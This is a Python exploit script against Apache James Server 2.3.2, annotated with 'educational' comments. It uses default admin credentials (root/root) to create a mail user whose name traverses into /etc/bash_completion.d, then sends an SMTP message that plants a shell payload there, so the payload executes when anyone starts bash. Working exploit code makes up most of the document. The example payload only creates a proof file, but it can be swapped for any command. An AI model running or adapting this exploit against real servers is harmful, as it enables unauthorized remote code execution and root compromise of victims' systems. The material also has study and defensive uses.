#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

#############################################################################
# EDUCATIONAL COMMENTARY - HOW THIS EXPLOIT WORKS
#############################################################################
#
# VULNERABILITY: Path Traversal + Arbitrary File Write via Email
#
# ATTACK CHAIN:
# 1. Connect to James Admin interface (port 4555) with default creds (root/root)
# 2. Create a malicious user with path traversal in the username
#    Example: "../../../../../../../../etc/bash_completion.d"
# 3. Send an email to that "user" via SMTP (port 25)
# 4. James writes the email to a file based on the username (path traversal!)
# 5. Email payload gets written to /etc/bash_completion.d (auto-executes on login)
# 6. Wait for user/root to login â†’ payload executes
#
# WHY IT WORKS:
# - James doesn't sanitize usernames during user creation
# - Email system writes messages to filesystem using username as path
# - /etc/bash_completion.d scripts run automatically when bash starts
#
#############################################################################

import socket  # For network connections (admin tool + SMTP)
import sys     # For command-line arguments
import time    # For delays between commands

#############################################################################
# PAYLOAD CONFIGURATION
#############################################################################
# The command that will execute when someone logs in
# This gets written to /etc/bash_completion.d and auto-runs on bash startup

#payload = 'touch /tmp/proof.txt' # Simple test - works for any user
payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # Only executes if root (UID 0)

# EXPLANATION:
# - '[ "$(id -u)" == "0" ]' checks if current user is root
# - && means "and if true, then..."
# - touch /root/proof.txt creates proof file (only root can write to /root/)

# CREDENTIALS: James Remote Administration Tool (Default on fresh install)
user = 'root'  # Default admin username
pwd = 'root'   # Default admin password
# NOTE: Try these first. If changed, you'd need to enumerate/brute-force

#############################################################################
# ARGUMENT VALIDATION
#############################################################################
if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]  # Target IP running Apache James

#############################################################################
# HELPER FUNCTION - Receive data and wait
#############################################################################
def recv(s):
        s.recv(1024)      # Receive up to 1024 bytes from socket
        time.sleep(0.2)   # Wait 200ms for server to process (prevents race conditions)

try:
    #########################################################################
    # PHASE 1: EXPLOIT JAMES ADMIN INTERFACE (Port 4555)
    #########################################################################
    print "[+]Connecting to James Remote Administration Tool..."

    # Create TCP socket
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # AF_INET = IPv4, SOCK_STREAM = TCP

    s.connect((ip,4555))  # Connect to James admin interface on port 4555
    s.recv(1024)          # Receive welcome banner

    # Authenticate with default credentials
    s.send(user + "\n")   # Send username "root"
    s.recv(1024)          # Receive password prompt
    s.send(pwd + "\n")    # Send password "root"
    s.recv(1024)          # Receive login confirmation

    print "[+]Creating user..."

    # THE EXPLOIT: Create user with path traversal in username
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    # - "adduser" = James command to create new email user
    # - "../../../../../../../../etc/bash_completion.d" = PATH TRAVERSAL username
    # - "exploit" = password for the malicious "user"
    #
    # WHY THIS WORKS:
    # James creates a mailbox directory using the username without sanitization
    # This creates /etc/bash_completion.d as a "user mailbox"
    # Later, emails sent here will write files that auto-execute on bash login

    s.recv(1024)          # Receive user creation confirmation
    s.send("quit\n")      # Logout from admin interface
    s.close()             # Close admin connection

    #########################################################################
    # PHASE 2: SEND MALICIOUS EMAIL VIA SMTP (Port 25)
    #########################################################################
    print "[+]Connecting to James SMTP server..."

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))  # Connect to SMTP service on port 25

    # SMTP Handshake
    s.send("ehlo team@team.pl\r\n")  # EHLO command (identifies sender to SMTP server)
    recv(s)                          # Receive SMTP capabilities

    print "[+]Sending payload..."

    # Begin email transaction
    s.send("mail from: <'@team.pl>\r\n")  # Set sender (doesn't need to be valid)
    recv(s)

    # THE KEY: Send email to the path-traversal "user" we created
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    # RCPT TO = recipient address
    # This email will be written to /etc/bash_completion.d (our fake "user")
    recv(s)

    # Start email body
    s.send("data\r\n")  # DATA command begins message content
    recv(s)

    s.send("From: team@team.pl\r\n")  # Email header (cosmetic)
    s.send("\r\n")                     # Blank line separates headers from body
    s.send("'\n")                      # Malformed quote (might help bypass filters)

    # THE PAYLOAD: Our malicious bash command
    s.send(payload + "\n")
    # This line gets written to a file in /etc/bash_completion.d
    # Files in that directory auto-execute when any user starts bash

    s.send("\r\n.\r\n")  # SMTP end-of-message marker (period on its own line)
    recv(s)

    s.send("quit\r\n")   # Close SMTP connection
    recv(s)
    s.close()

    print "[+]Done! Payload will be executed once somebody logs in."
    # NOTE: Execution is NOT immediate. Waits for user/root to:
    # - SSH into the box
    # - Start a new bash session
    # - Trigger bash completion loading

except:
    print "Connection failed."

#############################################################################
# MANUAL VERIFICATION AFTER RUNNING:
#############################################################################
# 1. SSH to target as legitimate user
# 2. Check if /root/proof.txt exists:
#    ls -la /root/proof.txt
# 3. If it exists, exploit succeeded (root logged in and triggered payload)